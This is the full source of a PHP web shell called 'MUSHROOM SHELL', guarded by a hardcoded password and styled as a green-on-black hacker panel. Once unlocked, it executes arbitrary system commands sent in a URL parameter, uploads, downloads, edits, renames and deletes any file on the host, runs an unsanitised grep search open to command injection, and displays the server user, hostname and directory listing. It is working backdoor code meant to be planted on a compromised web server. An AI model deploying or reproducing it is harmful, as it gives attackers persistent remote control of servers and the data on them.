<?php
$pass="r3d0pwn";
session_start();

if(!isset($_SESSION['auth']) || $_SESSION['auth'] !== md5($pass)){
    if(isset($_POST['pass']) && $_POST['pass'] === $pass){
        $_SESSION['auth'] = md5($pass);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    echo'
<!DOCTYPE html>
<html>
<head><title>🍄 MUSHROOM SHELL - LOGIN</title>
<style>body{background:#0a0a0a;color:#00ff00;font-family:"Courier New",monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.container{background:#111;padding:40px;border:2px solid #00ff00;border-radius:15px;text-align:center;}h2{color:#00ff00;text-shadow:0 0 10px #00ff00;}input[type="password"]{background:#0a0a0a;color:#00ff00;border:1px solid #00ff00;padding:12px 20px;width:200px;border-radius:5px;font-family:"Courier New",monospace;}button{background:#00ff00;color:#0a0a0a;padding:12px 25px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;font-family:"Courier New",monospace;}button:hover{background:#00cc00;box-shadow:0 0 20px #00ff00;}
</style>
</head>
<body><div class="container"><h2>🍄 MUSHROOM SHELL</h2><form method="POST"><input type="password" name="pass" placeholder="Password" autofocus><br><br><button type="submit">🚀 LOGIN</button></form></div></body>
</html>';
exit;
}

function get_ip(){$ip=$_SERVER['REMOTE_ADDR']??'0.0.0.0';$h=['HTTP_X_FORWARDED_FOR','HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP'];foreach($h as$k){if(!empty($_SERVER[$k])){$x=explode(',',$_SERVER[$k]);$ip=trim($x[0]);break;}}return$ip;}
$status_test=@shell_exec("echo test 2>&1");$status="OFFLINE";if($status_test!==null&&trim($status_test)==='test'){$status="ONLINE";}
if(isset($_GET['logout'])){session_destroy();header("Location: ".$_SERVER['PHP_SELF']);exit;}
if(isset($_GET['cmd'])){$c=$_GET['cmd'];echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars(shell_exec($c." 2>&1"))."</pre>";exit;}
if(isset($_GET['download'])){$f=$_GET['download'];if(file_exists($f)){header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($f).'"');readfile($f);exit;}echo"File not found.";exit;}
if(isset($_GET['delete'])){$f=$_GET['delete'];if(file_exists($f)){if(is_dir($f)){rmdir($f);}else{unlink($f);}echo"Deleted: $f";}else{echo"Not found.";}exit;}
if(isset($_GET['rename'])&&isset($_GET['to'])){$o=$_GET['rename'];$n=$_GET['to'];if(file_exists($o)&&rename($o,$n)){echo"Renamed: $o → $n";}else{echo"Rename failed.";}exit;}
if(isset($_GET['mkdir'])){$d=$_GET['mkdir'];if(!file_exists($d)&&mkdir($d,0755,true)){echo"Directory created: $d";}else{echo"Failed.";}exit;}
if(isset($_GET['create'])){$f=$_GET['create'];if(!file_exists($f)&&touch($f)){echo"File created: $f";}else{echo"Failed.";}exit;}
if(isset($_POST['edit_save'])){$f=$_POST['edit_file'];$c=$_POST['edit_content'];if(file_put_contents($f,$c)){echo"Saved: $f";}else{echo"Save failed.";}exit;}
if(isset($_GET['search'])){$k=$_GET['search'];echo"<pre style='color:#00ff00;background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #00ff00;'>".htmlspecialchars(shell_exec("find . -type f -exec grep -l '$k' {} \; 2>/dev/null | head -50"))."</pre>";exit;}
if(isset($_FILES['file'])){$t=basename($_FILES['file']['name']);if(move_uploaded_file($_FILES['file']['tmp_name'],$t)){echo"<h3 style='color:#00ff00;'>✅ Uploaded: <a href='$t' style='color:#00ff00;'>$t</a></h3>";}else{echo"<h3 style='color:#ff0044;'>❌ Upload failed!</h3>";}exit;}
?>
<!DOCTYPE html>
<html>
<head><title>🍄 MUSHROOM SHELL</title>
<style>*{box-sizing:border-box;}body{background:#0a0a0a;color:#00ff00;font-family:"Courier New",monospace;margin:0;padding:20px;}.container{max-width:900px;margin:0 auto;background:#111;border:2px solid #00ff00;border-radius:15px;padding:30px;box-shadow:0 0 50px rgba(0,255,0,0.05);}h2{color:#00ff00;text-shadow:0 0 15px #00ff00;border-bottom:1px solid #00ff00;padding-bottom:10px;}h3{color:#00ff00;border-bottom:1px solid #333;padding-bottom:8px;margin-top:18px;}.info{background:#0a0a0a;padding:12px 18px;border-radius:5px;border:1px solid #222;margin-bottom:20px;}.info span{color:#00ff00;}input[type="text"],input[type="file"]{background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:10px 15px;border-radius:5px;width:100%;font-family:"Courier New",monospace;}input[type="text"]:focus{border-color:#00ff00;outline:none;}button{background:#00ff00;color:#0a0a0a;padding:10px 25px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;font-family:"Courier New",monospace;}button:hover{background:#00cc00;box-shadow:0 0 20px #00ff00;}.row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px;}.row input[type="text"]{flex:1;min-width:150px;}.row button{flex:0;}.output{background:#0a0a0a;padding:15px;border:1px solid #333;border-radius:5px;margin-top:10px;white-space:pre-wrap;min-height:50px;overflow-x:auto;}.file-list{max-height:300px;overflow-y:auto;}hr{border:none;border-top:1px solid #333;margin:20px 0;}.footer{color:#555;font-size:12px;text-align:center;margin-top:18px;display:flex;justify-content:center;gap:20px;flex-wrap:wrap;}.footer a{color:#00ff00;text-decoration:none;}.footer a:hover{text-decoration:underline;}.status{display:inline-block;padding:2px 12px;border-radius:3px;font-size:12px;font-weight:bold;}.status.online{background:#00ff00;color:#0a0a0a;}.status.offline{background:#ff0044;color:#fff;}a{color:#00ff00;text-decoration:none;}a:hover{text-decoration:underline;}
</style>
</head>
<body>
<div class="container">
<h2>🍄 MUSHROOM SHELL</h2>
<div class="info">
<div><span>👤 User:</span> <?=htmlspecialchars(shell_exec("whoami 2>&1"))?></div>
<div><span>📁 PWD:</span> <?=htmlspecialchars(shell_exec("pwd 2>&1"))?></div>
<div><span>🖥️ Hostname:</span> <?=htmlspecialchars(shell_exec("hostname 2>&1"))?></div>
<div><span>🌐 IP:</span> <?=htmlspecialchars(get_ip())?></div>
<div><span>🔒 Status:</span> <span class="status <?=strtolower($status)?>"><?=$status?></span></div>
</div>
<h3>📟 Command</h3>
<div class="row"><input type="text" id="cmd" placeholder="Enter command..." onkeydown="if(event.key==='Enter'){runCmd();}"><button onclick="runCmd()">▶ RUN</button></div>
<div class="output" id="output">Ready...</div>
<h3>📤 Upload File</h3>
<div class="row"><input type="file" id="file-input"><button onclick="uploadFile()">⬆ UPLOAD</button></div>
<div id="upload-status"></div>
<h3>📂 File Operations</h3>
<div class="row"><input type="text" id="file-path" placeholder="File/dir path"><button onclick="fileAction('create')">Create</button><button onclick="fileAction('mkdir')">Mkdir</button><button onclick="fileAction('delete')">Delete</button><button onclick="fileAction('download')">Download</button></div>
<div class="row"><input type="text" id="file-rename-old" placeholder="Old name"><input type="text" id="file-rename-new" placeholder="New name"><button onclick="fileAction('rename')">Rename</button></div>
<div class="row"><input type="text" id="file-search" placeholder="Search keyword..."><button onclick="fileAction('search')">Search</button></div>
<h3>✏️ Edit File</h3>
<div class="row"><input type="text" id="edit-file-path" placeholder="File to edit"><button onclick="loadEditFile()">Load</button></div>
<textarea id="edit-file-content" rows="10" style="width:100%;background:#0a0a0a;color:#00ff00;border:1px solid #333;border-radius:5px;padding:10px;font-family:'Courier New',monospace;font-size:13px;margin-top:5px;"></textarea>
<button onclick="saveEditFile()" style="margin-top:8px;">Save</button>
<div id="edit-status"></div>
<h3>📂 Files</h3>
<div class="output file-list"><pre><?=htmlspecialchars(shell_exec("ls -la 2>&1"))?></pre></div>
<hr>
<div class="footer"><span>🍄 MUSHROOM SHELL</span> | <a href="?logout=1">🚪 Logout</a></div>
</div>
<script>
function runCmd(){var c=document.getElementById('cmd').value;if(!c)return;var o=document.getElementById('output');o.innerHTML='⏳ Running...';fetch('?cmd='+encodeURIComponent(c)).then(r=>r.text()).then(d=>{o.innerHTML=d;}).catch(e=>{o.innerHTML='❌ Error: '+e;});}
function uploadFile(){var f=document.getElementById('file-input').files[0];if(!f){alert('Select a file!');return;}var fd=new FormData();fd.append('file',f);var s=document.getElementById('upload-status');s.innerHTML='⏳ Uploading...';fetch('',{method:'POST',body:fd}).then(r=>r.text()).then(d=>{s.innerHTML=d;}).catch(e=>{s.innerHTML='❌ Error: '+e;});}
function fileAction(a){var p=document.getElementById('file-path').value;var u='';if(a==='create'){if(!p){alert('Path required!');return;}u='?create='+encodeURIComponent(p);}else if(a==='mkdir'){if(!p){alert('Path required!');return;}u='?mkdir='+encodeURIComponent(p);}else if(a==='delete'){if(!p){alert('Path required!');return;}if(!confirm('Delete '+p+'?'))return;u='?delete='+encodeURIComponent(p);}else if(a==='download'){if(!p){alert('Path required!');return;}window.location.href='?download='+encodeURIComponent(p);return;}else if(a==='rename'){var o=document.getElementById('file-rename-old').value;var n=document.getElementById('file-rename-new').value;if(!o||!n){alert('Old and new names required!');return;}u='?rename='+encodeURIComponent(o)+'&to='+encodeURIComponent(n);}else if(a==='search'){var k=document.getElementById('file-search').value;if(!k){alert('Search keyword required!');return;}u='?search='+encodeURIComponent(k);}fetch(u).then(r=>r.text()).then(d=>{alert(d);}).catch(e=>{alert('Error: '+e);});}
function loadEditFile(){var f=document.getElementById('edit-file-path').value;if(!f){alert('File path required!');return;}fetch('?download='+encodeURIComponent(f)).then(r=>r.text()).then(d=>{document.getElementById('edit-file-content').value=d;}).catch(e=>{alert('Error: '+e);});}
function saveEditFile(){var f=document.getElementById('edit-file-path').value;var c=document.getElementById('edit-file-content').value;if(!f){alert('File path required!');return;}var fd=new FormData();fd.append('edit_file',f);fd.append('edit_content',c);fetch('',{method:'POST',body:fd}).then(r=>r.text()).then(d=>{document.getElementById('edit-status').innerHTML=d;}).catch(e=>{alert('Error: '+e);});}
</script>
</body>
</html>